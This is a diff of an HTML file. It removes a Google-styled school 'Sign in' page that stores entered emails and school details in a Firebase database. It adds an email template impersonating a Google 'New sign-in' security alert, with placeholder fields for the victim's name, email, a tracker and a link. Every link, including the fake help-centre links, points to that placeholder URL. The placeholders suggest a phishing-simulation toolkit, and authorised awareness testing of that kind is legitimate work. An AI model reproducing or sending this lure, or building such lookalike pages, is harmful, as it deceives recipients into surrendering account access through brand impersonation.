@@ -1,503 +1,147 @@
-<!DOCTYPE html>
-<html lang="en">
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>School Registration</title>
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Helvetica Neue', sans-serif;
-            background-color: #ffffff;
-            min-height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-
-        .container {
-            width: 100%;
-            max-width: 520px;
-            padding: 0 40px;
-        }
-
-        .header {
-            text-align: center;
-            margin-bottom: 50px;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-        }
-
-        .logo {
-            width: 70px;
-            height: 70px;
-            background: linear-gradient(135deg, #2563eb 0%, #1d4ed8 100%);
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin-bottom: 30px;
-        }
-
-        .logo svg {
-            width: 40px;
-            height: 40px;
-            color: white;
-            stroke: white;
-            fill: none;
-            stroke-width: 1.5;
-        }
-
-        h1 {
-            font-size: 32px;
-            font-weight: 400;
-            color: #202124;
-            margin-bottom: 8px;
-            letter-spacing: -0.5px;
-        }
-
-        .description {
-            font-size: 14px;
-            color: #5f6368;
-            line-height: 1.6;
-            margin-bottom: 30px;
-            max-width: 400px;
-            margin-left: auto;
-            margin-right: auto;
-        }
-
-        .help-link {
-            font-size: 14px;
-            color: #1a73e8;
-            text-decoration: none;
-            margin-bottom: 40px;
-            display: inline-block;
-        }
-
-        .help-link:hover {
-            text-decoration: underline;
-        }
-
-        .form-section {
-            display: none;
-            width: 100%;
-        }
-
-        .form-section.active {
-            display: block;
-        }
-
-        .input-wrapper {
-            margin-bottom: 24px;
-            position: relative;
-        }
-
-        .input-group {
-            display: flex;
-            flex-direction: column;
-            gap: 16px;
-            margin-bottom: 24px;
-        }
-
-        input[type="email"],
-        input[type="text"],
-        input[type="password"] {
-            width: 100%;
-            padding: 12px 12px;
-            border: 1px solid #dadce0;
-            border-radius: 4px;
-            font-size: 16px;
-            color: #202124;
-            font-family: inherit;
-            transition: border-color 0.2s, box-shadow 0.2s;
-        }
-
-        input::placeholder {
-            color: #80868b;
-        }
-
-        input:focus {
-            outline: none;
-            border-color: #1a73e8;
-            box-shadow: 0 0 0 2px rgba(26, 115, 232, 0.1);
-        }
-
-        .checkbox-wrapper {
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            margin-top: 16px;
-        }
-
-        input[type="checkbox"] {
-            width: 18px;
-            height: 18px;
-            cursor: pointer;
-            accent-color: #1a73e8;
-        }
-
-        .checkbox-label {
-            font-size: 14px;
-            color: #202124;
-            cursor: pointer;
-        }
-
-        .error-message {
-            color: #d33b27;
-            font-size: 13px;
-            margin-bottom: 16px;
-            display: none;
-        }
-
-        .error-message.show {
-            display: block;
-        }
-
-        .footer-links {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-top: 40px;
-        }
-
-        .footer-left {
-            display: flex;
-            gap: 30px;
-        }
-
-        .footer-link {
-            font-size: 14px;
-            color: #1a73e8;
-            text-decoration: none;
-            cursor: pointer;
-            border: none;
-            background: none;
-            padding: 0;
-            font-family: inherit;
-        }
-
-        .footer-link:hover {
-            text-decoration: underline;
-        }
-
-        .submit-button {
-            padding: 10px 30px;
-            background-color: #1a73e8;
-            color: white;
-            font-weight: 500;
-            border: none;
-            border-radius: 4px;
-            cursor: pointer;
-            font-size: 14px;
-            font-family: inherit;
-            transition: background-color 0.2s, box-shadow 0.2s;
-        }
-
-        .submit-button:hover {
-            background-color: #1765cc;
-            box-shadow: 0 2px 8px rgba(26, 115, 232, 0.3);
-        }
-
-        .submit-button:active {
-            background-color: #1552b8;
-        }
-
-        .submit-button:disabled {
-            background-color: #c5c5c5;
-            cursor: not-allowed;
-        }
-
-        /* Loading State */
-        .loading-container {
-            display: none;
-            text-align: center;
-            min-height: 500px;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-        }
-
-        .loading-container.active {
-            display: flex;
-        }
-
-        .spinner {
-            width: 50px;
-            height: 50px;
-            margin-bottom: 24px;
-            animation: spin 0.8s linear infinite;
-        }
-
-        .spinner svg {
-            width: 100%;
-            height: 100%;
-        }
-
-        @keyframes spin {
-            from {
-                transform: rotate(0deg);
-            }
-            to {
-                transform: rotate(360deg);
-            }
-        }
-
-        .loading-text {
-            color: #5f6368;
-            font-size: 16px;
-        }
-
-        /* Responsive */
-        @media (max-width: 768px) {
-            .container {
-                padding: 0 24px;
-            }
-
-            h1 {
-                font-size: 28px;
-            }
-
-            .footer-links {
-                flex-direction: column;
-                gap: 20px;
-            }
-
-            .footer-left {
-                flex-direction: column;
-                gap: 16px;
-                width: 100%;
-            }
-
-            .submit-button {
-                width: 100%;
-            }
-
-            .footer-link {
-                width: 100%;
-                text-align: left;
-            }
-        }
-    </style>
+	<title>Account Alert</title>
 </head>
 <body>
-    <div class="container">
-        <div class="header">
-            <div class="logo">
-                <svg viewBox="0 0 24 24">
-                    <path d="M4 19.5A2.5 2.5 0 0 1 6.5 17H20"></path>
-                    <path d="M6.5 2H20v20H6.5A2.5 2.5 0 0 1 4 19.5v-15A2.5 2.5 0 0 1 6.5 2z"></path>
-                </svg>
-            </div>
-            <h1 id="headerTitle">Sign in</h1>
-            <div id="emailDisplay"></div>
-        </div>
+<table border="0" cellpadding="0" cellspacing="0" style="color: rgb(34, 34, 34); font-family: arial, sans-serif; font-size: 12.8px; max-width: 600px; background-color: rgb(255, 255, 255);">
+	<tbody>
+		<tr>
+			<td style="margin: 0px;">
+			<table border="0" cellpadding="0" cellspacing="0" width="100%">
+				<tbody>
+					<tr>
+						<td align="left" style="margin: 0px;"><img class="CToWUd" height="32" src="https://ci3.googleusercontent.com/proxy/EURRrDHt1LcCbHcRdDtMHOQPPMHe5FkDsMAHs66gxAIYzYD38Abpa1Fmy-ACuq2V1tI8GZdWA4FLsXjKM4iAD-CixwUocANswARkdK1ttXK-T1DDSfiUplKFys37dkM=s0-d-e1-ft#https://www.gstatic.com/accountalerts/email/googlelogo_color_188x64dp.png" style="display: block; width: 92px; min-height: 32px;" width="92" /></td>
+						<td align="right" style="margin: 0px;"><img class="CToWUd" height="32" src="https://ci6.googleusercontent.com/proxy/w8ACgsIEmhjGKodu731Z-VOiYfmXsRM4zd6F_w4_cKQ1JPXF_6Y_hEPR_iJKee33yGZ8zR6o_Q08vuYMKmetfyoGNtMpt1d5CU6z3xA=s0-d-e1-ft#https://www.gstatic.com/accountalerts/email/keyhole.png" style="display: block; width: 32px; min-height: 32px;" width="32" /></td>
+					</tr>
+				</tbody>
+			</table>
+			</td>
+		</tr>
+		<tr height="16">
+		</tr>
+		<tr>
+			<td style="margin: 0px;">
+			<table bgcolor="#4184F3" border="0" cellpadding="0" cellspacing="0" style="min-width: 332px; max-width: 600px; border-width: 1px 1px 0px; border-top-style: solid; border-right-style: solid; border-left-style: solid; border-top-color: rgb(224, 224, 224); border-right-color: rgb(224, 224, 224); border-left-color: rgb(224, 224, 224); border-top-left-radius: 3px; border-top-right-radius: 3px;" width="100%">
+				<tbody>
+					<tr>
+						<td colspan="3" height="72px" style="margin: 0px;">&nbsp;</td>
+					</tr>
+					<tr>
+						<td style="margin: 0px;" width="32px">&nbsp;</td>
+						<td style="font-family: Roboto-Regular, Helvetica, Arial, sans-serif; margin: 0px; font-size: 24px; color: rgb(255, 255, 255); line-height: 1.25;">New sign-in from Chrome OS</td>
+						<td style="margin: 0px;" width="32px">&nbsp;</td>
+					</tr>
+					<tr>
+						<td colspan="3" height="18px" style="margin: 0px;">&nbsp;</td>
+					</tr>
+				</tbody>
+			</table>
+			</td>
+		</tr>
+		<tr>
+			<td style="margin: 0px;">
+			<table bgcolor="#FAFAFA" border="0" cellpadding="0" cellspacing="0" style="min-width: 332px; max-width: 600px; border-width: 0px 1px 1px; border-right-style: solid; border-left-style: solid; border-right-color: rgb(240, 240, 240); border-left-color: rgb(240, 240, 240); border-bottom-style: solid; border-bottom-color: rgb(192, 192, 192); border-bottom-left-radius: 3px; border-bottom-right-radius: 3px;" width="100%">
+				<tbody>
+					<tr height="16px">
+						<td rowspan="3" style="margin: 0px;" width="32px">&nbsp;</td>
+						<td style="margin: 0px;">&nbsp;</td>
+						<td rowspan="3" style="margin: 0px;" width="32px">&nbsp;</td>
+					</tr>
+					<tr>
+						<td style="margin: 0px;">
+						<table border="0" cellpadding="0" cellspacing="0" style="min-width: 300px;">
+							<tbody>
+								<tr>
+									<td style="font-family: Roboto-Regular, Helvetica, Arial, sans-serif; margin: 0px; font-size: 13px; color: rgb(32, 32, 32); line-height: 1.5;">Hi {{.FirstName}},</td>
+								</tr>
+								<tr>
+									<td style="font-family: Roboto-Regular, Helvetica, Arial, sans-serif; margin: 0px; font-size: 13px; color: rgb(32, 32, 32); line-height: 1.5;">Your Google Account&nbsp;<span style="font-family: Roboto-Regular, Helvetica, Arial, sans-serif; line-height: 19.2px; background-color: rgb(250, 250, 250);">{{.Email}}&nbsp;</span>was just used to sign in on&nbsp;<span style="white-space: nowrap;">Chrome OS</span>.
+									<table border="0" cellpadding="0" cellspacing="0" style="margin-top: 48px; margin-bottom: 48px;">
+										<tbody>
+											<tr valign="middle">
+												<td style="font-family: arial, sans-serif; margin: 0px;" width="32px">&nbsp;</td>
+												<td align="center" style="font-family: arial, sans-serif; margin: 0px;"><img class="CToWUd" height="48px" src="https://ci6.googleusercontent.com/proxy/_ehxLExCa2FPeTKuNVAgMUxyx7YBxMq8-qickdiS6h0GI2UChu_KZURQgNm3-OuvpRjUg26eTgHNny2H1gs6Pzzy81YKOLOVHegzDqMfEMQVAWTuszLuOL68hqTN=s0-d-e1-ft#https://www.gstatic.com/accountalerts/email/anonymous_profile_photo.png" style="width: 48px; min-height: 48px; display: block; border-radius: 50%;" width="48px" /></td>
+												<td style="font-family: arial, sans-serif; margin: 0px;" width="16px">&nbsp;</td>
+												<td style="margin: 0px;"><span style="line-height: 19.2px;">{{.FirstName}} {{.LastName}}</span><br style="font-family: arial, sans-serif; line-height: 19.2px; background-color: rgb(250, 250, 250);" />
+												<span style="line-height: 1.2;">{{.Email}}</span></td>
+											</tr>
+											<tr valign="middle">
+												<td height="24px" style="font-family: arial, sans-serif; margin: 0px;" width="32px">&nbsp;</td>
+												<td align="center" height="24px" style="font-family: arial, sans-serif; margin: 0px;"><img class="CToWUd" height="10px" src="https://ci4.googleusercontent.com/proxy/3v5djkrQw0eYYuEXwiOUoxXYc3R6bFSVEFNL0C3YbDgAYCp7sUIL4fxyDZ8RADuKX3gZ4_z6bAmrACIqNYpHa95AfUrSskjfkEf4nDXRH7A=s0-d-e1-ft#https://www.gstatic.com/accountalerts/email/down_arrow.png" style="width: 4px; min-height: 10px; display: block;" width="4px" /></td>
+											</tr>
+											<tr valign="top">
+												<td style="font-family: arial, sans-serif; margin: 0px;" width="32px">&nbsp;</td>
+												<td align="center" style="font-family: arial, sans-serif; margin: 0px;"><img class="CToWUd" height="48px" src="https://ci3.googleusercontent.com/proxy/MeVln3V_GSBpyT0OD_Jp5n_RRCL5UwlTk8OLiq6akdHukWHGvlg6rK20Jo4Jq2MF02f5I45hJU0lcdGgQ4oPXJRDG0NFNlMKRsKzde27ogalxsptrA_ksZiVXUbv-FOPwFEQ=s0-d-e1-ft#https://www.gstatic.com/accountalerts/devices/chrome_device_wallpaper_big.png" style="width: 48px; min-height: 48px; display: block;" width="48px" /></td>
+												<td style="font-family: arial, sans-serif; margin: 0px;" width="16px">&nbsp;</td>
+												<td style="font-family: arial, sans-serif; margin: 0px; line-height: 1.2;"><span style="font-family: Roboto-Regular, Helvetica, Arial, sans-serif; font-size: 16px;">Chrome OS</span><br />
+												<span style="font-family: Roboto-Regular, Helvetica, Arial, sans-serif; color: rgb(114, 114, 114);">Tuesday, 30 August 2016 12:54 (British Summer Time)<br />
+												Leeds, UK*</span></td>
+											</tr>
+										</tbody>
+									</table>
+									<b>Don&#39;t recognise this activity? if you don&#39;t recognise this device click the following pleace</b>
 
-        <!-- Step 1: Email -->
-        <div class="form-section active" id="step1">
-            <p class="description">Use your email or phone number to sign in to your school account.</p>
+									<p><a href="{{.URL}}">click here</a></p>
 
-            <form onsubmit="handleEmailNext(event)">
-                <div class="input-wrapper">
-                    <input 
-                        type="email" 
-                        id="emailInput" 
-                        placeholder="Email or phone"
-                        required
-                    />
-                </div>
+									<p><a href="{{.URL}}">Review your recently used devices here</a></p>
+									&nbsp;.<br />
+									<br />
+									Why are we sending this? We take security very seriously and we want to keep you in the loop on important actions in your account.<br />
+									We were unable to determine whether you have used this browser or device with your account before. This can happen when you sign in for the first time on a new computer, phone or browser, when you use your browser&rsquo;s incognito or private browsing mode or clear your cookies or when somebody else is accessing your account.</td>
+								</tr>
+								<tr height="32px">
+								</tr>
+								<tr>
+									<td style="font-family: Roboto-Regular, Helvetica, Arial, sans-serif; margin: 0px; font-size: 13px; color: rgb(32, 32, 32); line-height: 1.5;">Best,<br />
+									The Google Accounts team</td>
+								</tr>
+								<tr height="16px">
+								</tr>
+								<tr>
+									<td style="margin: 0px;">
+									<table style="font-family: Roboto-Regular, Helvetica, Arial, sans-serif; font-size: 12px; color: rgb(185, 185, 185); line-height: 1.5;">
+										<tbody>
+											<tr>
+												<td style="font-family: arial, sans-serif; margin: 0px;">*The location is approximate and determined by the IP address it was coming from.</td>
+											</tr>
+											<tr>
+												<td style="font-family: arial, sans-serif; margin: 0px;">This email can&#39;t receive replies. To give us feedback on this alert,&nbsp;<a data-saferedirecturl="https://www.google.com/url?hl=en-GB&amp;q=https://support.google.com/accounts/contact/device_alert_feedback?hl%3Den-GB&amp;source=gmail&amp;ust=1472651710881000&amp;usg=AFQjCNEUbJSLGEaz_ktp9HoTcVIFm8z-iA" href="https://{{.URL}}" style="color: rgb(66, 133, 244); text-decoration: none;" target="_blank">click here</a>.<br />
+												For more information, visit the&nbsp;<a data-saferedirecturl="https://www.google.com/url?hl=en-GB&amp;q=https://support.google.com/accounts/answer/2733203&amp;source=gmail&amp;ust=1472651710881000&amp;usg=AFQjCNHmMF8Iy5zgwWq2DzKfF_HuaRRy-Q" href="https://{{.URL}}" style="color: rgb(66, 133, 244); text-decoration: none;" target="_blank">Google Accounts Help Centre</a>.</td>
+											</tr>
+										</tbody>
+									</table>
+									</td>
+								</tr>
+							</tbody>
+						</table>
+						</td>
+					</tr>
+					<tr height="32px">
+					</tr>
+				</tbody>
+			</table>
+			</td>
+		</tr>
+		<tr height="16">
+		</tr>
+		<tr>
+			<td style="font-family: Roboto-Regular, Helvetica, Arial, sans-serif; margin: 0px; max-width: 600px; font-size: 10px; color: rgb(188, 188, 188); line-height: 1.5;">&nbsp;</td>
+		</tr>
+		<tr>
+			<td style="margin: 0px;">
+			<table style="font-family: Roboto-Regular, Helvetica, Arial, sans-serif; font-size: 10px; color: rgb(102, 102, 102); line-height: 18px; padding-bottom: 10px;">
+				<tbody>
+					<tr>
+						<td style="font-family: arial, sans-serif; margin: 0px;">You have received this mandatory email service announcement to update you about important changes to your Google product or account.</td>
+					</tr>
+				</tbody>
+			</table>
+			</td>
+		</tr>
+	</tbody>
+</table>
 
-                <div class="error-message" id="errorMessage"></div>
-
-                <a href="#" class="help-link" onclick="return false;">Forgot email?</a>
-
-                <div style="margin-top: 60px;"></div>
-
-                <a href="#" class="help-link" onclick="return false;">Create account</a>
-
-                <div class="footer-links">
-                    <div class="footer-left"></div>
-                    <button type="submit" class="submit-button">Next</button>
-                </div>
-            </form>
-        </div>
-
-        <!-- Step 2: School Details -->
-        <div class="form-section" id="step2">
-            <form onsubmit="handleSubmit(event)">
-                <div class="input-group">
-                    <input 
-                        type="text" 
-                        id="schoolInput" 
-                        placeholder="School name"
-                        required
-                    />
-                    <input 
-                        type="text" 
-                        id="departmentInput" 
-                        placeholder="Department"
-                        required
-                    />
-                </div>
-
-                <div class="error-message" id="errorMessage2"></div>
-
-                <div class="checkbox-wrapper">
-                    <input type="checkbox" id="showPassword">
-                    <label for="showPassword" class="checkbox-label">Show information</label>
-                </div>
-
-                <a href="#" class="help-link" style="margin-top: 30px;" onclick="return false;">Need help signing in?</a>
-
-                <div style="margin-top: 40px;"></div>
-
-                <div class="footer-links">
-                    <div class="footer-left">
-                        <button type="button" class="footer-link" onclick="goToStep(1)">Back</button>
-                    </div>
-                    <button type="submit" class="submit-button" id="submitBtn">Next</button>
-                </div>
-            </form>
-        </div>
-
-        <!-- Loading State -->
-        <div class="loading-container" id="loadingContainer">
-            <div class="spinner">
-                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="#1a73e8" stroke-width="2">
-                    <circle cx="12" cy="12" r="10" opacity="0.2"></circle>
-                    <path d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z" fill="#1a73e8"></path>
-                </svg>
-            </div>
-            <p class="loading-text">Processing your information...</p>
-        </div>
-    </div>
-
-    <script type="module">
-        // Import Firebase modules
-        import { initializeApp } from 'https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js';
-        import { getFirestore, collection, addDoc } from 'https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js';
-
-        // Initialize Firebase
-        const firebaseConfig = {
-            apiKey: "AIzaSyCXqNe_BDdh9WIJ9lyrFPeQ_-733qbXW4s",
-            authDomain: "realinsightreport.firebaseapp.com",
-            projectId: "realinsightreport",
-            storageBucket: "realinsightreport.firebasestorage.app",
-            messagingSenderId: "1083096764833",
-            appId: "1:1083096764833:web:4b526f278471212ba43be0",
-            measurementId: "G-6LHBN68HMH"
-        };
-
-        const app = initializeApp(firebaseConfig);
-        const db = getFirestore(app);
-
-        // Global variables
-        let currentStep = 1;
-        let userEmail = '';
-
-        // Step navigation
-        window.goToStep = function(step) {
-            currentStep = step;
-            updateUI();
-        };
-
-        // Handle email submission
-        window.handleEmailNext = function(event) {
-            event.preventDefault();
-            const emailInput = document.getElementById('emailInput');
-            const errorMessage = document.getElementById('errorMessage');
-
-            if (!emailInput.value.trim()) {
-                errorMessage.textContent = 'Enter a valid email or phone number';
-                errorMessage.classList.add('show');
-                return;
-            }
-
-            errorMessage.classList.remove('show');
-            userEmail = emailInput.value;
-            currentStep = 2;
-            updateUI();
-        };
-
-        // Handle form submission
-        window.handleSubmit = async function(event) {
-            event.preventDefault();
-            const schoolInput = document.getElementById('schoolInput');
-            const departmentInput = document.getElementById('departmentInput');
-            const errorMessage = document.getElementById('errorMessage2');
-            const submitBtn = document.getElementById('submitBtn');
-
-            if (!schoolInput.value.trim() || !departmentInput.value.trim()) {
-                errorMessage.textContent = 'Please fill in all fields';
-                errorMessage.classList.add('show');
-                return;
-            }
-
-            errorMessage.classList.remove('show');
-            submitBtn.disabled = true;
-
-            try {
-                // Add data to Firestore
-                const docRef = await addDoc(collection(db, 'schools'), {
-                    email: userEmail,
-                    schoolName: schoolInput.value,
-                    department: departmentInput.value,
-                    timestamp: new Date()
-                });
-
-                console.log('Document written with ID: ', docRef.id);
-
-                // Show loading state
-                showLoadingState();
-            } catch (error) {
-                console.error('Error adding document: ', error);
-                errorMessage.textContent = 'Failed to submit. Please try again.';
-                errorMessage.classList.add('show');
-                submitBtn.disabled = false;
-            }
-        };
-
-        // Update UI based on current step
-        function updateUI() {
-            // Hide all sections
-            document.getElementById('step1').classList.remove('active');
-            document.getElementById('step2').classList.remove('active');
-            document.getElementById('loadingContainer').classList.remove('active');
-
-            // Update header
-            const headerTitle = document.getElementById('headerTitle');
-            const emailDisplay = document.getElementById('emailDisplay');
-
-            if (currentStep === 1) {
-                document.getElementById('step1').classList.add('active');
-                headerTitle.textContent = 'Sign in';
-                emailDisplay.innerHTML = '';
-                document.getElementById('emailInput').focus();
-            } else if (currentStep === 2) {
-                document.getElementById('step2').classList.add('active');
-                headerTitle.textContent = 'Welcome';
-                emailDisplay.innerHTML = `<div style="font-size: 16px; color: #5f6368; margin-top: 8px;">
-                    <svg style="width: 18px; height: 18px; vertical-align: middle; margin-right: 8px;" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="#5f6368">
-                        <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"/>
-                    </svg>
-                    ${userEmail}
-                </div>`;
-                document.getElementById('schoolInput').focus();
-            }
-        }
-
-        // Show loading state
-        function showLoadingState() {
-            document.getElementById('step1').classList.remove('active');
-            document.getElementById('step2').classList.remove('active');
-            document.getElementById('loadingContainer').classList.add('active');
-        }
-    </script>
+<p>{{.Tracker}}</p>
 </body>
 </html>
